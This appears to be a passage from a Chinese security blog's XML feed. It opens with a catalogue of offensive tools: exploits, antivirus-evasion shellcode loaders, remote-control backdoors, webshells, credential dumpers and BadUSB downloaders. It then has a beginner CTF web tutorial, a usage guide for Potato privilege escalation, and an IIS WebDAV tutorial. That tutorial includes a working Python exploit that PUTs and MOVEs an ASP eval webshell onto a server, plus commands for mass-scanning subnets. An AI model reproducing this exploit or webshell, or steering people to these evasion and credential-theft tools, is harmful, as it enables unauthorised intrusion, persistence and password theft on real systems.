[+] 提权工具 K8_VBS提权脚本免杀生成器.rar<br>
[+] 进程注入 DLL注入进程工具过UAC<br>
[+] 提权工具 NV显卡提权NVexploit.rar<br>
[+] 提权工具 net2.0day.exe<br>
[+] 提权工具 K8dllhijack.rar DLL却持测试工具<br>
[+] 提权工具 Invoke-MS16-032.ps1<br>
[+] Apache 2.2.1.4 mod_isapi exploit.rar<br>


<h3>漏洞利用</h3>
[+] 漏洞利用 K8飞刀-EXPLOIT内含20个程序EXP（Drupal、Joomla、Wordpress、Vbulletin、Xampp、Zimbra、ThinkPHP、Magento、Discuz）<br>
[+] 漏洞利用 K8_Struts2_EXP (S2-045、devMode、S2-037、S2-032、S2-020、S2-019、S2-016、S2-013、S2-009、S2-005)<br>
[+] 漏洞检测 Ladon POC Moudle CVE-2019-11043 (PHP-FPM + Ngnix)<br>
[+] 漏洞利用 cve-2019-0604 SharePoint RCE exploit<br>
[+] 漏洞利用 K8_JbossExp.exe Jboss Jmx-console exploit<br>
[+] 漏洞利用 K8 DotNetNuke DNNspot Store =3.0 GetShell exploit.rar<br>
[+] 漏洞利用 CVE-2018-2628 Weblogic GetShell EXPLOIT<br>
[+] 漏洞利用 ColdFusion 8 LFI EXP<br>
[+] 漏洞利用 K8_TomcatExp_1124[K.8].rar<br>
[+] 漏洞利用 WordPress 4.2 XSS 0day 20150429[K.8].rar<br>
[+] 漏洞利用 k8_zabbix_exp_20160820[K.8].rar<br>

<h3>漏洞利用</h3>
[+] 漏洞利用 K8飞刀-EXPLOIT内含20个程序EXP（Drupal、Joomla、Wordpress、Vbulletin、Xampp、Zimbra、ThinkPHP、Magento、Discuz）<br>
[+] 漏洞利用 K8_Struts2_EXP (S2-045、devMode、S2-037、S2-032、S2-020、S2-019、S2-016、S2-013、S2-009、S2-005)<br>
[+] 漏洞利用 K8 DotNetNuke DNNspot Store =3.0 GetShell exploit.rar<br>
[+] 漏洞利用 CVE-2018-2628 Weblogic GetShell EXPLOIT<br>
[+] 漏洞利用 ColdFusion 8 LFI EXP<br>
[+] 漏洞利用 K8_TomcatExp_1124[K.8].rar<br>
[+] 漏洞利用 WordPress 4.2 XSS 0day 20150429[K.8].rar<br>
[+] 漏洞利用 k8_zabbix_exp_20160820[K.8].rar<br>

<h3>漏洞利用</h3>
[+] 漏洞利用 K8飞刀-EXPLOIT内含20个程序EXP（Drupal、Joomla、Wordpress、Vbulletin、Xampp、Zimbra、ThinkPHP、Magento、Discuz）<br>
[+] 漏洞利用 K8_Struts2_EXP (S2-045、devMode、S2-037、S2-032、S2-020、S2-019、S2-016、S2-013、S2-009、S2-005)<br>
[+] 漏洞利用 K8 DotNetNuke DNNspot Store =3.0 GetShell exploit.rar<br>
[+] 漏洞利用 CVE-2018-2628 Weblogic GetShell EXPLOIT<br>
[+] 漏洞利用 ColdFusion 8 LFI EXP<br>
[+] 漏洞利用 K8_TomcatExp_1124[K.8].rar<br>
[+] 漏洞利用 WordPress 4.2 XSS 0day 20150429[K.8].rar<br>
[+] 漏洞利用 k8_zabbix_exp_20160820[K.8].rar<br>
[+] 漏洞利用 K8_Ecshop_Exploit<br>
[+] 漏洞利用 Magento 1.7.0.2 漏洞EXP_20150624[K.8].rar<br>
[+] 漏洞利用 K8COOKIE.rar Cookie注入工具<br>
[+] 漏洞利用 Jboss_invoke_Exp_k8.rar MSF脚本<br>
[+] 漏洞利用 DB_Owner_GetShell_K8.rar MSSQL DB权限拿SHELL工具<br>
<h3>挂马工具</h3>
[+] 挂马工具 K8domainVBS.exe K8域控植入脚本生成器<br>
[+] 挂马工具 K8ARPTool.rar 内网ARP工具批量挂马<br>
[+] 挂马工具 CHM网马生成器.exe<br>
[+] 0day漏洞 K8飞刀内置5个0day漏洞利用(Word漏洞\IE神洞\WVS\RAR)<br>
[+] 0day漏洞 [视频]BT5 MSF JAVA 0day CVE-2013-0422 Exploit Demo By K8team.rar<br>
[+] 0day漏洞 [视频]Hacking Team Flash 0day样本(Firefox IE)完美触发_20150707[K8].rar<br>
<h3>漏洞环境</h3>
[+] 漏洞环境 K8-ASP注入漏洞环境.rar<br>
[+] 漏洞环境 k8bbs(php+mysql)注入漏洞环境.rar<br>
[+] 漏洞环境 K8 SQL强化练习工具V1.0_20190301[K8].rar<br>
[+] 漏洞环境 K8迷你ASP服务器.exe 绿色一键启动<br>
<h3>免杀工具</h3>
[+] 免杀工具 scrunBase64 ShellCode免杀加载器(CS & MSF)<br>
[+] 免杀工具 scrunBase32 ShellCode免杀加载器(CS & MSF)<br>
[+] 免杀工具 scrun.exe & scrun.py ShellCode免杀加载器(CS & MSF)<br>
[+] 免杀工具 K8_SC_ENCODE(CS & Msf免杀工具).rar<br>
[+] 测试工具 K8shellcodeLoader.exe Shellcode测试<br>
[+] 免杀工具 K8随机免杀花指令生成器V2.0.exe<br>
[+] 免杀工具 K8数字签名添加器.exe<br>
[+] 捆绑工具 K8免杀系统自带捆绑器加强版V2.0.EXE<br>
<h3>远控后门</h3>
[+] 远控后门 K8_Gh0st_Bin.rar 不免杀漏洞测试上线用<br>
[+] 远控后门 TeamServer.exe  CS中转Win版,无需Kali下生成cobaltstrike.store文件<br>
[+] 远控后门 QQ远控 ClientKey 利用工具.rar 不免杀18年仍然可用19年未测估计也还行<br>
[+] 远控后门 vncdoor.exe  VNC后门可正反向<br>
[+] 远控后门 k8_SSH_Manage.exe 渗透专用SSH(执行完后立即销毁会话,不像putty保存会话常暴露IP)<br>
[+] 连接工具 sshcmd.exe   渗透专用SSH(执行完后立即销毁会话,同时清除连接IP)<br>
[+] 连接工具 sshshell.exe 交互式SSH类似putty保持会话(目标显示IP一直连着)<br>
[+] 远控后门 K8手机远控电脑V1.1_20121020[K.8].rar<br>
[+] 远控后门 JspShellExec CMD下JSP一句话连接工具<br>
[+] 捆绑工具 K8_rarBind.rar RAR捆绑工具<br>

<h3>嗅探工具</h3>
[+] 嗅探工具 K8getPC.py 内网存活主机探测(无需端口\无视防火墙)<br>
<h3>扫描工具</h3>
[+] 扫描工具 K8Cscan5.0.rar 大型内网渗透扫描器内置22个功能,支持Cobalt Strike<br>
[+] 扫描工具 K8PortScan开源跨平台大型网络端口扫描器(Bin: Windows/Kali/SUSE)<br>
[+] 扫描插件 K8Cscan Moudle WebLogicScan.rar Weblogic通用GetShell<br>
[+] 扫描插件 K8Cscan Moudle CiscoScan.rar Cisco思科探测插件<br>
[+] 扫描插件 K8Cscan Moudle OSScan2.rar 系统版本探测插件2<br>
[+] 扫描插件 K8Cscan Moudle PortScan.cs 端口扫描插件源码<br>
[+] 扫描插件 K8Cscan Moudle FtpScan.rar Ftp密码扫描插件<br>
[+] 扫描插件 K8Cscan Moudle MysqlScan.rar Mysql密码扫描插件<br>
[+] 扫描插件 K8Cscan Moudle OnlinePC.rar 存活主机扫描插件<br>
[+] 扫描插件 K8Cscan Moudle WebBanner.rar WebBanner标题扫描插件<br>
[+] 扫描插件 K8Cscan Moudle WmiScan.rar Wmi扫描Win系统密码插件<br>
[+] 扫描工具 K8Cscan for SameWeb.rar C段旁站扫描工具<br>
[+] 扫描工具 K8Cscan for SubDomain.rar 子域名扫描工具<br>
[+] 扫描工具 cping3.0.rar 大型内外网渗透主机扫描工具<br>
[+] 扫描工具 K8_C段旁注工具6.0<br>
[+] 扫描工具 s加强版.exe<br>
[+] 扫描工具 K8openssl批量 Bat版.rar<br>
[+] 扫描工具 K8破壳SMTP Bat版.rar<br>
[+] 扫描工具 WPdetection.exe WordPress站点信息获取<br>
[+] 扫描工具 K8-S2批量.rar Struts2批量工具<br>
[+] 扫描工具 smbcheck.exe MS17-010漏洞检测，cping、cscan批量专用<br>
<h3>数据库</h3>
[+] 脱库工具 K8mysqlCmd.rar Mysql数据库免驱连接工具<br>
[+] 脱库工具 K8_mysql脱裤20170114(千万).php<br>
[+] 脱库工具 K8Packwebshell.aspx 整站打包工具<br>
[+] 脱库工具 K8outSQL.aspx MSSQL导库工具<br>
<h3>加密解密</h3>
[+] K8飞刀里大量加密解密算法、编码解码、SQL注入、XSS等<br>
[+] 密码破解 SharpWeb.exe 浏览器帐密读取工具(Firefox/Chorme/IE)<br>
[+] 密码破解 laZagne.exe 本地密码检索工具(支持XP/2003)<br>
[+] 密码破解 sshtest.exe SSH密码登陆测试可结合Cscan进行批量破解<br>
[+] 嗅探工具 k8ftpsniffer.py FTP<br>
[+] 密码破解 K8_DNN_Password_Decrypt_20161110.rar dotnetnuke密码解密工具<br>
[+] 密码破解 Invoke-Mimikatz.ps1  Mimikatz 20181209 <br>
[+] 密码破解 mz.exe    Mimikatz-2.1.1-20181209 X86 一键版<br>
[+] 密码破解 mz64.exe  Mimikatz-2.1.1-20181209 X64 一键版<br>
[+] 密码破解 K8_FTP爆破PHP脚本20151010.rar 内网渗透用<br>
[+] 密码破解 K8_Mysql爆破PHP脚本20151009.rar 内网渗透用<br>
[+] 密码破解 K8_ipcscan 爆破IPC自动种马工具+教程.rar<br>
[+] 密码破解 weblogic密码解密工具(exe & jar)<br>
[+] 密码破解 K8fuckVNC.rar k8vncpwd.exe VNC密码解密工具<br>
[+] 密码破解 K8getTeamViewPWD_20150705[K.8].rar<br>
[+] 密码破解 K8正方密码解密工具_20150801[K.8].rar<br>
[+] 密码破解 getBrowserPWD_1124[K.8].rar  Firefox\Ghrome 浏览器密码读取工具<br>
[+] 密码破解 getvpnpwd.exe VPN、ADSL宽带帐密读取工具(仅限XP、2003)<br>
[+] 密码破解 GetPassword_x64.rar GetPwd_K8.rar 一键获取明文<br>
[+] 密码破解 K8_FuckOneShell 一句话密码爆破秒破10万<br>
[+] 加密解密 K8Base32_Decode_20161110.rar<br>
[+] 斛密工具 k8ungzip.exe GZIP 用于提取0day网马Powershell执行PAYLOAD<br>
[+] 密码破解 K8FTP密码破解器V2.0_20190301[K8].rar<br>
[+] 密码破解 K8Access数据库密码读取器_20190301[K8].rar<br>
[+] 加密工具 K8_FileHideImg.exe 任意文件隐藏至图片工具<br>
<h3>安全辅助</h3>
[+] 安全工具 K8木马病毒后门监视器V3.0.rar 捆绑后门木马释放路径、Shell上传路径查看<br>
[+] 安全工具 K8进程拦截.rar (比方说访问网页浏览器调用外站EXE执行说明0day来了,而且可防止木马运行)<br>
[+] 安全工具 K8驱动防止WebShell提权工具.rar (就是说无法通过WEBSHELL执行任意命令,就算有签名的EXE也不行)<br>
[+] 辅助工具 K8注册表跳转.exe<br>
<h3>转发代理</h3>
[+] 端口转发 PortTran.rar  .NET端口转发工具<br>
[+] 端口转发 K8PortMap.exe D7端口映射工具<br>

<h3>WebShell</h3>
[+] 转换工具 k8exe2bat.exe 任意文件转Bat工具(WebShell无法上传EXE解决方案)<br>
[+] 上传工具 K8upload_1125[K8].rar 新型小马上传工具支持任意文件(内置asp\php\jsp小马)<br>
[+] 连接工具 K8一句话ASP木马客户端加强程序版.exe<br>
[+] WebShell k8cmd.ascx<br>
[+] WebShell k8cmd.pl<br>
[+] WebShell k8cmd.py<br>
[+] WebShell k8飞刀CMD.jsp<br>
[+] WebShell K8飞刀A专用UA一句话木马.asp<br>
[+] WebShell K8飞刀PHP-专用UA一句话木马.php<br>
[+] WebShell K8飞刀专用UA一句话木马.asxp<br>
[+] WebShell shellcode.aspx <br>
<h3>硬件渗透</h3>
[+]BadUSB K8飞刀  内含有大量Teensy渗透功能脚本自行研究<br>
[+]BadUSB Teensy 兼容所有Windows和Linux系统下载者.ino<br>
<h3>其它工具</h3>
[+]教程录制 K8屏幕录像 高压缩率版_20190301[K8].rar<br>
[+]系统美化 K8文件夹个性设置工具.exe<br>
[+]系统美化 K8个性桌面右键菜单.exe<br>
[+]搜索工具 K8吉他谱搜索工具_20190301[K8].rar<br>
[+]系统美化 图标提取器.exe<br>
[+]系统美化 k8cmd.exe<br>
[+]辅助工具 K8侠盗猎车4外挂.exe<br>
[+]辅助工具 K8迅雷、快车、旋风地址互换工具.exe<br>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Tool</tag>
        <tag>K8tools</tag>
      </tags>
  </entry>
  <entry>
    <title>〖教程〗K8飞刀-网络安全CTF解题Web篇</title>
    <url>/p/ctf_k8fly.html</url>
    <content><![CDATA[<p>前断时间有人和我说什么时候有空出些CTF用的工具，实际上CTF考查的内容，实战中用到的很多工具都可以使用，关键在于你懂不懂用。也看到有人搜索如何使用K8飞刀，在此以CTF题为例，教大家如何使用K8飞刀的HackerIE功能（相当于Hackbar插件的高级版），以及编码解码功能的使用（模块涉及多种编码以及加密解密算法），除了实战会用到以外，CTF也可以用到，不过CTF中常见的应该是BASE64、HTML编码、SQL注入编码之类的，实战中密码除了MD5、SHA1以外最常见的莫过于BASE64了，XSS里HTML编码等也会经常用到，至于什么栅栏密码之类的实战几乎很少遇到，所以有些CTF出题和实战还是两回事，虽然说栅栏算法也非常简单，但从实战角度来说，考查用处不大，实战几乎不见的有必要考吗？如同书呆子考试靠死记硬背靠运气拿高分，拿了高分实际工作解决不了新问题，这种就是没用。</p>
<h3 id="考查知识点"><a href="#考查知识点" class="headerlink" title="考查知识点"></a>考查知识点</h3><p>CTF常见考查方法</p>
<p>1.查看HTML代码<br>2.GET提交<br>3.POST提交<br>4.伪造IP<br>5.Base64解密<br>6.HTML实体解密</p>
<h3 id="题目1-HTML查看"><a href="#题目1-HTML查看" class="headerlink" title="题目1 HTML查看"></a>题目1 HTML查看</h3><p>网址： <a href="http://123.206.87.240:8002/web2/" target="_blank" rel="noopener">http://123.206.87.240:8002/web2/</a></p>
<p>分析：<br>直接访问会看到一堆表情，浏览器右键查看HTML代码即可，（但实战遇到屏蔽右键查看就无效）</p>
<p>解题：</p>
<p>K8飞刀–HackerIE–Get方式–网址web2–结果选”文本”–提交，即可看到注释中的Flag</p>
<p><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_html1.PNG"></p>
<p>PS：K8飞刀可以无视”网站屏蔽查看HTML代码“功能，现实这样的网页很多，很多CTF不考查，所以CTF和实战是有区别的。</p>
<h3 id="题目2-HTML实体"><a href="#题目2-HTML实体" class="headerlink" title="题目2 HTML实体"></a>题目2 HTML实体</h3><p>网址： <a href="http://123.206.87.240:8002/web3/" target="_blank" rel="noopener">http://123.206.87.240:8002/web3/</a></p>
<p>分析：<br>直接访问会无限弹框，提示FLAG就在这里，所以这里我们选择”文本”模式查看，浏览器模式会无限弹框。</p>
<p>解题：</p>
<p>K8飞刀–HackerIE–Get方式–网址web3–结果选”文本”–提交，看到一串可疑的HTML实体字符串，<br>编码解码–粘贴加密的Flag–右键选中Flag–编码转换–XSS跨站–HTML实体(Dec),解密获取Falg</p>
<p><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_html2.PNG"></p>
<h3 id="题目3-GET提交"><a href="#题目3-GET提交" class="headerlink" title="题目3 GET提交"></a>题目3 GET提交</h3><p>网址：<a href="http://123.206.87.240:8002/get/" target="_blank" rel="noopener">http://123.206.87.240:8002/get/</a></p>
<p>$what=$_GET[‘what’];<br><br>echo $what;<br><br>if($what==’flag’)<br><br>echo ‘flag{****}’;<br></p>
<p>分析：<br>从页面代码看出，要求通过GET方式提交what=flag</p>
<p>解题：<br>网址 <a href="http://123.206.87.240:8002/get?what=flag" target="_blank" rel="noopener">http://123.206.87.240:8002/get?what=flag</a><br>K8飞刀–HackerIE–Get方式–网址get–结果选”文本”–提交，可看到返回flag</p>
<p><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_get.PNG"></p>
<h3 id="题目4-POST提交"><a href="#题目4-POST提交" class="headerlink" title="题目4 POST提交"></a>题目4 POST提交</h3><p>网址: <a href="http://123.206.87.240:8002/post/" target="_blank" rel="noopener">http://123.206.87.240:8002/post/</a></p>
<p>$what=$_POST[‘what’];<br><br>echo $what;<br><br>if($what==’flag’)<br><br>echo ‘flag{****}’;<br></p>
<p>分析：<br>从页面代码看出，要求通过GET方式提交what=flag</p>
<p>解题：<br>K8飞刀–HackerIE–Post方式–网址post–结果选”文本”–提交，可看到返回flag<br>网址：<a href="http://123.206.87.240:8002/post/" target="_blank" rel="noopener">http://123.206.87.240:8002/post/</a>  提交数据：what=flag</p>
<p><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_post.PNG"></p>
<h3 id="题目5-伪造IP"><a href="#题目5-伪造IP" class="headerlink" title="题目5 伪造IP"></a>题目5 伪造IP</h3><p>伪造IP这个考查点非常不错，因为现实中确实有很多网站后台存在IP限制。</p>
<p><a href="http://123.206.31.85:1003/" target="_blank" rel="noopener">http://123.206.31.85:1003/</a></p>
<p>使用K8飞刀访问提示“IP禁止访问”，切换文本看到注释中含有Base64字符串,编码解密得到test123</p>
<p>K8飞刀–HackerIE–Post方式–提交,返回Flag<br>提交数据：user=admin&amp;pass=test123</p>
<p>X-Forwarded-For 值为 127.0.0.1</p>
<p><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_xorip.PNG"></p>
<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>历史版本: <a href="https://github.com/k8gege/K8tools" target="_blank" rel="noopener">https://github.com/k8gege/K8tools</a></p>
<div style="text-align: center; width: 710px; border: green solid 0px;">
<img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg">
</div>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>K8飞刀</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>〖教程〗Ladon提权之Potato系列</title>
    <url>/p/potato.html</url>
    <content><![CDATA[<h1 id="Ladon提权之PipePotato-BadPotato-SweetPotato-PrintSpoofer"><a href="#Ladon提权之PipePotato-BadPotato-SweetPotato-PrintSpoofer" class="headerlink" title="Ladon提权之PipePotato/BadPotato/SweetPotato/PrintSpoofer"></a>Ladon提权之PipePotato/BadPotato/SweetPotato/PrintSpoofer</h1><p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
<script language="javascript" type="text/javascript">
window.location.href="http://k8gege.org/Ladon/potato.html";
</script>


<p>Ladon提权之PipePotato/BadPotato/SweetPotato/PrintSpoofer</p>
<h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><p>&gt;= Ladon 7.2.0<br>Update: 20200810</p>
<h3 id="Potato提权原理"><a href="#Potato提权原理" class="headerlink" title="Potato提权原理"></a>Potato提权原理</h3><p>通过各种方法在本地NTLM中继获取SYSTEM令牌，再通过模拟令牌执行命令，通过以上方法提权统称为potato(不管是否基于原potato修改)。就像SQL注入，通过特定SQL语句注入获取特定数据库信息统称为SQL注入，而不管如何编写的SQL语句，是否基于别人的SQL语句修改。</p>
<h3 id="提权条件"><a href="#提权条件" class="headerlink" title="提权条件"></a>提权条件</h3><p>1 本地NTLM中继获取SYSTEM令牌<br>2 SeImpersonatePrivilege特权</p>
<p>测试中任意用户都可以通过本地NTLM中继获取到SYSTEM令牌权限，但是由于USER默认不开户SeImpersonatePrivilege特权，无法模拟令牌创建进程无法执行命令，所以会导致很多Potato提权失败。如下方”Win7管理员提权至SYSTEM“图片上部分就是USER部分的Potato提权失败，下方是管理员权限，而其它环境都是IIS权限。所以为了方便Ladon默认也显示当前用户SeImpersonatePrivilege特权情况。</p>
<h3 id="SweetPotato"><a href="#SweetPotato" class="headerlink" title="SweetPotato"></a>SweetPotato</h3><p>SweetPotato集成了原版Potato和JulyPotato的功能，包含DCOM/WINRM/PrintSpoofer方法获取SYSTEM。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Load SweetPotato</span><br><span class="line">Local Privilege Escalation from Windows Service Accounts to SYSTEM</span><br><span class="line">Vulnerable: Win7-Win10/Win2008-2019</span><br><span class="line">Usage:</span><br><span class="line">Ladon SweetPotato cmdline</span><br></pre></td></tr></table></figure>

<h3 id="PrintSpoofer"><a href="#PrintSpoofer" class="headerlink" title="PrintSpoofer"></a>PrintSpoofer</h3><p>pipePotato:一种新型的通用提权漏洞，PrintSpoofer是一个利用打印机PIPE提权的方法，国人写了个工具叫BadPotato。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Load BadPotato</span><br><span class="line">Local Privilege Escalation from Windows Service Accounts to SYSTEM</span><br><span class="line">PrintSpoofer Abusing Impersonate Privileges.</span><br><span class="line">Vulnerable: Win8-Win10/Win2012-2019</span><br><span class="line">Usage:</span><br><span class="line">Ladon BadPotato cmdline</span><br></pre></td></tr></table></figure>

<h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p>1 Win7 IIS 应用池用户权限<br>2 Win7 本地管理员用户权限<br>3 Win2012 IIS 应用池权限<br>4 Win7 本地服务用户权限<br>5 Win8 本地服务用户权限</p>
<p>PS：由于BadPotato不支持WIN7系统，所以以上环境主要以测试SweetPotato为主。</p>
<h4 id="Win7管理员提权至SYSTEM"><a href="#Win7管理员提权至SYSTEM" class="headerlink" title="Win7管理员提权至SYSTEM"></a>Win7管理员提权至SYSTEM</h4><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/lpe/Win7_Admin_SweetPotato.PNG"></p>
<h4 id="Win7-IIS应用池提权至SYSTEM"><a href="#Win7-IIS应用池提权至SYSTEM" class="headerlink" title="Win7 IIS应用池提权至SYSTEM"></a>Win7 IIS应用池提权至SYSTEM</h4><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/lpe/IIS_Win7_SweetPotato.PNG"></p>
<h4 id="2012-R2-IIS应用池提权至SYSTEM"><a href="#2012-R2-IIS应用池提权至SYSTEM" class="headerlink" title="2012 R2 IIS应用池提权至SYSTEM"></a>2012 R2 IIS应用池提权至SYSTEM</h4><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/lpe/IIS8_2012_PR.PNG"></p>
<h4 id="WIN7服务用户CS提权至SYSTEM"><a href="#WIN7服务用户CS提权至SYSTEM" class="headerlink" title="WIN7服务用户CS提权至SYSTEM"></a>WIN7服务用户CS提权至SYSTEM</h4><p>本地服务用户权限下直接以SYSTEM权限上控Cobalt Strike<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/lpe/CS_PR_SweetPotato.png"></p>
<h4 id="WIN8服务用户提权至SYSTEM"><a href="#WIN8服务用户提权至SYSTEM" class="headerlink" title="WIN8服务用户提权至SYSTEM"></a>WIN8服务用户提权至SYSTEM</h4><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/lpe/BadPotato.png"></p>
<h3 id="IIS提权"><a href="#IIS提权" class="headerlink" title="IIS提权"></a>IIS提权</h3><p><a href="http://k8gege.org/p/6b9b3afe.html">http://k8gege.org/p/6b9b3afe.html</a></p>
<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
<div style="text-align: center; width: 710px; border: green solid 0px;">
<img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg">
</div>
]]></content>
      <categories>
        <category>提权</category>
      </categories>
      <tags>
        <tag>LPE</tag>
        <tag>EXP</tag>
      </tags>
  </entry>
  <entry>
    <title>〖教程〗LadonExp使用IIS写权限Webdav漏洞GetShell</title>
    <url>/p/iisput.html</url>
    <content><![CDATA[<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
<script language="javascript" type="text/javascript">
window.location.href="http://k8gege.org/Ladon/iisput.html";
</script>

<p>LadonExp生成器使用教程之IIS写权限漏洞利用，含环境配置、EXP生成、批量利用、Pyhton复现代码。</p>
<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>该漏洞的产生原因来源于服务器配置不当造成，此漏洞主要是因为服务器开启了webdav的组件导致的可以扫描到当前的操作，具体操作其实是通过webdav的OPTION来查询是否支持PUT。</p>
<h3 id="IIS配置"><a href="#IIS配置" class="headerlink" title="IIS配置"></a>IIS配置</h3><p>1 启用webdav组件<br>2 目录给写权限(为了方便直接eveyone完全写入权限)<br>3 脚本资源访问权限(不然MOVE失败即无法GetShell)</p>
<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/iis/iis6_cfg.PNG"></p>
<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/iis/iis6_cfg2.PNG"></p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>使用LadonEXP可轻松复现此类漏洞，在Ladon改名前(Cscan)已复现过Tomcat，详情参考Tomcat CVE-2017-12615视频： <a href="https://github.com/k8gege/K8CScan/tree/master/Video" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/tree/master/Video</a></p>
<h4 id="LadonExp配置PUT"><a href="#LadonExp配置PUT" class="headerlink" title="LadonExp配置PUT"></a>LadonExp配置PUT</h4><p>功能：上传123.TXT<br>Target: <a href="http://192.168.1.22" target="_blank" rel="noopener">http://192.168.1.22</a><br>Method: Put<br>addurl: 123.txt<br>Data: &lt;%eval request(k8gege)%&gt;<br>点击buildexe-&gt;TestExe测试<br>成功返回 Created</p>
<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/iis/iis_put.PNG"></p>
<h4 id="LadonExp配置MOVE"><a href="#LadonExp配置MOVE" class="headerlink" title="LadonExp配置MOVE"></a>LadonExp配置MOVE</h4><p>功能：将123.txt改名1.asp<br>Target: <a href="http://192.168.1.22/123.txt" target="_blank" rel="noopener">http://192.168.1.22/123.txt</a><br>Method: Move<br>Destination: <a href="http://192.168.1.22/1.asp" target="_blank" rel="noopener">http://192.168.1.22/1.asp</a></p>
<p>点击buildexe-&gt;TestExe测试<br>成功返回 Created</p>
<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/iis/iis_move.PNG"></p>
<p>PS: 当然也可以直接PUT写入可解析的其它格式，也不一定非得先PUT再MOVE才能GetShell</p>
<h4 id="Ladon批量"><a href="#Ladon批量" class="headerlink" title="Ladon批量"></a>Ladon批量</h4><p>扫描C段，当然也可以A段B段</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon 192.168.1.1/c 生成.dll</span><br><span class="line">Ladon 192.168.1.1/24 生成.dll</span><br></pre></td></tr></table></figure>

<h4 id="TXT批量"><a href="#TXT批量" class="headerlink" title="TXT批量"></a>TXT批量</h4><p>url.txt里放批量地址，不在同一个段的,示例如下<br><a href="http://192.168.1.1" target="_blank" rel="noopener">http://192.168.1.1</a><br><a href="http://192.10.5.8:808" target="_blank" rel="noopener">http://192.10.5.8:808</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon 生成.dll</span><br></pre></td></tr></table></figure>

<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>Python实现利用代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding="utf-8"</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">put_url = <span class="string">'http://192.168.1.22/2.txt'</span></span><br><span class="line">move_url = <span class="string">'http://192.168.1.22/2.txt'</span></span><br><span class="line">move_headers = &#123;</span><br><span class="line">    <span class="string">'Destination'</span>:<span class="string">'http://192.168.1.22/shell.asp'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">put_data = <span class="string">"&lt;%eval request('k8gege')%&gt;"</span></span><br><span class="line"></span><br><span class="line">post_data = &#123;</span><br><span class="line">    <span class="string">'#'</span>:<span class="string">''</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.request(<span class="string">'PUT'</span>,url=put_url,data=put_data)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        response = requests.request(<span class="string">'MOVE'</span>,url=move_url,headers=move_headers)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">207</span>:</span><br><span class="line">            response = requests.post(url=<span class="string">'http://192.168.1.22/shell.asp'</span>,data=post_data)</span><br><span class="line">            print(response.content.decode(<span class="string">"gb2312"</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(response.status_code)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>


<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a><br>IIS Exp: <a href="https://github.com/k8gege/iisput" target="_blank" rel="noopener">https://github.com/k8gege/iisput</a></p>
<div style="text-align: center; width: 710px; border: green solid 0px;">
<img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg">
</div>
]]></content>
      <categories>
        <category>GetShell</category>
      </categories>
      <tags>
        <tag>IIS</tag>
        <tag>EXP</tag>
      </tags>
  </entry>
  <entry>
    <title>〖教程〗使用Ladon捕获Windonws登陆密码</title>
    <url>/p/GetWinAuth.html</url>
    <content><![CDATA[<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
<script language="javascript" type="text/javascript">
window.location.href="http://k8gege.org/Ladon/GetWinAuth.html";
</script>


